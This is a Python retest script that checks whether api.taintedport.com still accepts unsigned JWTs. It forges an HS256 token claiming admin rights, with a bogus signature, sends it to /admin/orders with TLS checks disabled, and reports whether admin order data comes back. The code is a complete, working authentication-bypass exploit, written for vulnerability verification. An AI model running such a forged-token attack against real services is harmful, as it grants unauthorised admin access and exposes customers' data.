     1	#!/usr/bin/env python3
     2	"""Verify: JWT signature not verified on api.taintedport.com.
     3	
     4	Mints a JWT with HS256 header, an arbitrary payload (is_admin=true, user_id=1),
     5	and a random signature. If the server accepts it on GET /admin/orders, the
     6	vulnerability is still present.
     7	
     8	Optional environment variables:
     9	    TARGET_URL      Base URL (default: https://api.taintedport.com)
    10	
    11	Usage:
    12	    python3 verify.py
    13	"""
    14	import os
    15	import sys
    16	import json
    17	import base64
    18	import requests
    19	import urllib3
    20	
    21	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    22	
    23	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    24	
    25	
    26	def b64url(data):
    27	    if isinstance(data, dict):
    28	        data = json.dumps(data, separators=(",", ":")).encode()
    29	    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
    30	
    31	
    32	def check():
    33	    # sanity — endpoint should reject when no token is presented
    34	    r = requests.get(f"{TARGET_URL}/admin/orders", verify=False, timeout=15)
    35	    if r.status_code != 401:
    36	        print(f"[ERROR] Baseline no-token request returned {r.status_code}, expected 401. "
    37	              "Endpoint behaviour changed — please review manually.")
    38	        sys.exit(1)
    39	
    40	    header = b64url({"alg": "HS256", "typ": "JWT"})
    41	    payload = b64url({
    42	        "user_id": 1,
    43	        "email": "verify@example.com",
    44	        "is_admin": True,
    45	        "iat": 1,
    46	        "exp": 9999999999,
    47	    })
    48	    forged = f"{header}.{payload}.QkFEU0lH"  # "BADSIG" base64url
    49	
    50	    r = requests.get(
    51	        f"{TARGET_URL}/admin/orders",
    52	        headers={"Authorization": f"Bearer {forged}"},
    53	        verify=False,
    54	        timeout=15,
    55	    )
    56	
    57	    try:
    58	        body = r.json()
    59	    except Exception:
    60	        body = {}
    61	
    62	    if r.status_code == 200 and body.get("success") and isinstance(body.get("orders"), list):
    63	        print(f"[VULNERABLE] Forged HS256 token with garbage signature accepted at "
    64	              f"GET /admin/orders (HTTP 200, {len(body['orders'])} orders returned)")
    65	        sys.exit(0)
    66	
    67	    print(f"[NOT VULNERABLE] Forged token rejected — HTTP {r.status_code}: {r.text[:200]}")
    68	    sys.exit(1)
    69	
    70	
    71	if __name__ == "__main__":
    72	    check()